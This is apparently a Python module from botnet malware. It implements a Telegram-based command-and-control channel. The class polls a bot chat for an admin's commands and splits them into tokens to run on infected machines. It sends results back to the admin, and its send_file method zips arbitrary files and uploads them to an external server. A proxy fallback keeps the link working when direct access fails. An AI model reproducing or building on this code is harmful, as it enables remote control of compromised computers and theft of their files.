import os
import logging
import urllib
from typing import Dict, List, Any


from .base_engine import BaseEngine

from ..exceptions import EngineException
from ..utils import proxy, upload_server
import requests

_logger = logging.getLogger(f"--> {__name__}  ")


class TelegramEngine(BaseEngine):
    """Telegram Engine
    transfer messages between `telegram account (admin)` and `botnet`
    """

    def __init__(self, token: str, admin_chat_id: str) -> None:
        self.token = token
        self.admin_chat_id = admin_chat_id
        self._use_proxy = False
        self._update_id = 0
        self._last_admin_message_id = None
        self._is_first_run = True

    def __str__(self):
        return f"<TOKEN:({self.token}), ADMIN_CHAT_ID:({self.admin_chat_id})>"

    def receive(self) -> List[str]:
        try:
            api_url = f"https://api.telegram.org/bot{self.token}/Getupdates?offset={self._update_id}&limit=100"
            response = self._http_request(method="POST", url=api_url)

            if response is False:
                return False

            admin_command = self._last_admin_message(response)

            if admin_command and not self._is_first_run:
                return admin_command.strip().split(" ")


            self._is_first_run = False
            return False

        except Exception as e:
            _logger.debug(f"receive: error {e}")
            raise EngineException(e)

    def send(self, message: str, additionalـinfo: dict = {}, reply_to_last_message: bool = False) -> bool:
        if type(additionalـinfo) != dict:
            additionalـinfo = {"additionalـinfo": additionalـinfo}

        if len(additionalـinfo) > 0:
            additionalـinfo_str = ""
            for k, v in additionalـinfo.items():
                additionalـinfo_str += f"\n{k}: {v}"
            additionalـinfo_str += f"\nuse_proxy: {self._use_proxy}"
            message = f"{message}\n\n___________________________{additionalـinfo_str}"

        message = urllib.parse.quote(message, safe=" ")

        res = []
        split_message = [] # split message to avoid telegram error
        for i in range(0, len(message), 4096):
            split_message.append(message[i : i + 4096])

        for msg in split_message:
            try:
                api_url = f"https://api.telegram.org/bot{self.token}/SendMessage?chat_id={self.admin_chat_id}&text={msg}"

                if self._last_admin_message_id and reply_to_last_message:
                    api_url = f"{api_url}&reply_to_message_id={self._last_admin_message_id}"

                res.append(self._http_request(method="POST", url=api_url))

            except Exception as e:
                _logger.debug(f"send: error {e}")
                raise EngineException(e)

        return res[0]

    def send_file(self, file_route: str, additionalـinfo: dict = {}) -> bool:
        try:
            is_true, res = upload_server.make_zip_file(file_route)
            if not is_true:
                self.send(f"{res}", additionalـinfo=additionalـinfo)
                _logger.debug(f"send_file.make_zip_file: {res}")
                return False

            else:
                zip_file_name = res

                with open(zip_file_name, "rb") as file:
                    _, data = upload_server.upload_server_1(
                        file=file.read(), file_name=zip_file_name
                    )

                os.remove(zip_file_name)
                self.send(data, additionalـinfo=additionalـinfo)
                return data

        except Exception as e:
            _logger.debug(f"send_file: error {e}")
            return False

    def _http_request(self, method: str, url: str) -> List[Dict[str, Any]]:
        if self._getme():
            self._use_proxy = False
            return requests.request(method=method, url=url, timeout=15).json()["result"]
        else:
            self._use_proxy = True
            return proxy.http_request(method=method, url=url, timeout=15)

    def _getme(self):
        try:
            res = requests.get(
                f"https://api.telegram.org/bot{self.token}/getMe", timeout=0.5
            )
            if res.status_code == 200:
                return res.json()
            return False

        except:
            return False

    def _last_admin_message(self, response: List[Dict[str, Any]]) -> str:
        """extract last admin message and remove previous messages"""
        admin_command = None
        already_executed = False

        if len(response) == 0:
            return None

        for message in response[::-1]:
            try:
                update_id = int(message["update_id"])
                last_message_chat_id = str(message["message"]["chat"]["id"])
                last_text = message["message"]["text"]
            except:
                continue

            if last_message_chat_id == self.admin_chat_id:
                # Ignore the previous executed messages
                if update_id <= self._update_id:
                    _logger.debug(f" - previous command from admin: {last_text}")
                    already_executed = True
                    break

                _logger.debug(f" - new command from admin: {last_text}")
                admin_command = last_text
                
                try:
                    self._last_admin_message_id = message["message"]["message_id"]
                except:
                    self._last_admin_message_id = None

                break


        ## clean previous messages ##
        """
        if (
             not any admin command in response page
           or
             IF RESPONSE PAGE IS FULL
             if first response on response page is last admin message
             if admin command already_executed (just for one attempt delay; So that the rest of the robots have time to read this message)
           ):
          clear response page messages
        
        else:
          just remove previous messages
        """
        if not (admin_command or already_executed) or (
            len(response) >= 100
            and response[0]["update_id"] == update_id
            and already_executed
        ):
            self._update_id = int(response.pop()["update_id"])
        else:
            self._update_id = update_id

        return admin_command
